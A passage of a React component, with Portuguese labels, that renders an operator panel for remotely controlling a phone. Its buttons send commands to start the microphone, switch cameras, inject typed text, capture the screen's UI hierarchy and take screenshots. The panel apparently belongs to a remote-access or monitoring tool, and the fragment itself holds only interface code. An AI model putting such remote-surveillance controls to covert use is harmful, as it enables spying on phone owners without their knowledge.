                      className="p-3 bg-slate-900 border border-cyan-500/30 rounded-xl hover:bg-cyan-500/20 hover:text-cyan-300 text-xs font-bold text-slate-200 transition-all flex flex-col items-center gap-1.5"
                    >
                      <Camera className="w-5 h-5 text-cyan-400" />
                      <span>Câmera Traseira</span>
                    </button>
                  </div>
                </div>
              )}

              {selectedDeviceModal.type === 'mic' && (
                <div className="space-y-3">
                  <div className="grid grid-cols-2 gap-2">
                    <button
                      onClick={() => handleSendModalCommand('START_MIC')}
                      className="p-3 bg-slate-900 border border-cyan-500/30 rounded-xl hover:bg-cyan-500/20 hover:text-cyan-300 text-xs font-bold text-slate-200 transition-all flex flex-col items-center gap-1.5"
                    >
                      <Mic className="w-5 h-5 text-emerald-400" />
                      <span>Iniciar Microfone</span>
                    </button>
                    <button
                      onClick={() => handleSendModalCommand('STOP_MIC')}
                      className="p-3 bg-slate-900 border border-slate-800 rounded-xl hover:bg-red-500/20 hover:text-red-300 text-xs font-bold text-slate-200 transition-all flex flex-col items-center gap-1.5"
                    >
                      <Mic className="w-5 h-5 text-red-400" />
                      <span>Parar Gravador</span>
                    </button>
                  </div>
                </div>
              )}

              {selectedDeviceModal.type === 'teclado' && (
                <div className="space-y-3">
                  <label className="text-xs text-slate-300 font-bold block">Texto a injetar no celular:</label>
                  <input
                    type="text"
                    value={modalTextContent}
                    onChange={(e) => setModalTextContent(e.target.value)}
                    placeholder="Digite a mensagem ou comando..."
                    className="w-full bg-slate-950 border border-cyan-500/40 rounded-xl p-2.5 text-xs text-slate-100 focus:outline-none focus:border-cyan-400"
                  />
                  <div className="flex justify-end gap-2">
                    <button
                      onClick={() => {
                        handleSendModalCommand('TYPE', { text: modalTextContent });
                        setModalTextContent('');
                      }}
                      className="px-4 py-2 bg-gradient-to-r from-cyan-500 to-blue-500 text-black font-bold text-xs rounded-xl hover:from-cyan-400 hover:to-blue-400 transition-all flex items-center gap-1"
                    >
                      <Send className="w-3.5 h-3.5" />
                      Injetar Texto
                    </button>
                  </div>
                </div>
              )}

              {selectedDeviceModal.type === 'leitor' && (
                <div className="space-y-3">
                  <p className="text-xs text-slate-400">
                    O Leitor V2 permite extrair a árvore de componentes da tela atual do aparelho em tempo real.
                  </p>
                  <button
                    onClick={() => handleSendModalCommand('REQUEST_HIERARCHY')}
                    className="w-full py-2.5 bg-slate-900 border border-cyan-500/40 rounded-xl text-cyan-300 font-bold text-xs hover:bg-cyan-500/20 transition-all flex items-center justify-center gap-1.5"
                  >
                    <FileText className="w-4 h-4" />
                    Capturar Estrutura da Tela
                  </button>
                </div>
              )}

              {selectedDeviceModal.type === 'screenshot' && (
                <div className="space-y-3">
                  <p className="text-xs text-slate-400">
                    Captura instantânea de tela requisitada ao aparelho.
                  </p>
                  <button
                    onClick={() => handleSendModalCommand('TAKE_SCREENSHOT')}
                    className="w-full py-2 bg-gradient-to-r from-cyan-500 to-blue-500 text-black font-bold text-xs rounded-xl hover:from-cyan-400 hover:to-blue-400 transition-all"
                  >
                    Tirar Nova Foto da Tela
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
